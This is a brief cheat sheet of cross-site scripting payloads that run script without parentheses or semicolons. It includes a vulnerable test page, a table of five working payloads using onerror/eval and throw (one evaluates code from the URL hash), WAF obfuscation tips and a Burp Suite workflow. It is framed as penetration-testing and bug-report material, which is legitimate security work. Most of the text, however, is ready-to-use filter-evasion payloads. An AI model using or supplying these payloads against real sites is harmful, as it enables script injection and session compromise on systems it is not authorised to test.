
## Basic Payload Setup
Create a test HTML file with a vulnerable input reflection:
```
<!DOCTYPE html><html><body><script>USER_INPUT</script></body></html>
```
Inject into USER_INPUT and load in browser. Expected result: alert box pops without needing () or ;.[1]

## Core Payloads by Filter Level

| Filter Type | Payload | Browser Notes | Steps |
|-------------|---------|---------------|-------|
| Basic no () ; | `<script>{onerror=alert}throw 1</script>` | All | 1. Inject payload. 2. Load page. 3. Alert fires on throw [1]. |
| Inline expression | `<script>throw onerror=alert,1</script>` | All | 1. Inject. 2. Last comma expression triggers alert [2]. |
| Chrome/Edge eval | `<script>throw onerror=eval,'=alert\x281\x29'</script>` | Chrome adds "Uncaught=" prefix | 1. Inject '=alert...' 2. Eval executes after prefix [2]. |
| Firefox object | `<script>{onerror=eval}throw{lineNumber:1,columnNumber:1,fileName:1,message:'alert\x281\x29'}</script>` | Bypasses "uncaught exception" | 1. Inject object literal. 2. Minimal props trigger eval [1]. |
| Universal no quotes | `<script>throw onerror=Uncaught=eval,e=new Error,e.message='/*'+location.hash,!!window.InstallTrigger?e:e.message</script>` | All, use #payload in URL | 1. Set URL hash to alert code. 2. Eval from hash [2]. |

## Testing Workflow
- Step 1: Confirm reflection context with `<script>1</script>` (check console).
- Step 2: Test basic `{onerror=alert}throw 1` – if blocked, try comma version.
- Step 3: Browser-test: Firefox needs object literal; Chrome handles string eval.
- Step 4: Obfuscate for WAF: Use \x28 for (, or template `alert`1``.[2]
- Step 5: Burp Suite: Intercept, paste payload, forward. Verify DOM via Inspector.[3]
- Step 6: POC video: Record screen (Kazam), upload to GitHub/Medium for report.[1]

## Defense Detection
Inject and check if payload executes despite filters. If yes, report with video showing no () ; usage. Test in Incognito across Chrome/Firefox/Safari.[2]

[1](https://portswigger.net/research/xss-without-parentheses-and-semi-colons)
[2](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
[3](https://hackviser.com/tactics/pentesting/web/xss)
[4](https://www.cobalt.io/blog/a-pentesters-guide-to-cross-site-scripting-xss)
[5](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
[6](https://blog.huli.tw/2025/09/15/en/xss-without-semicolon-and-parentheses/)
[7](https://www.acunetix.com/blog/articles/xss-filter-evasion-bypass-techniques/)
[8](https://portswigger.net/research/documenting-the-impossible-unexploitable-xss-labs)
[9](https://www.invicti.com/blog/web-security/xss-filter-evasion)
[10](https://portswigger.net/research/javascript-without-parentheses-using-dommatrix)
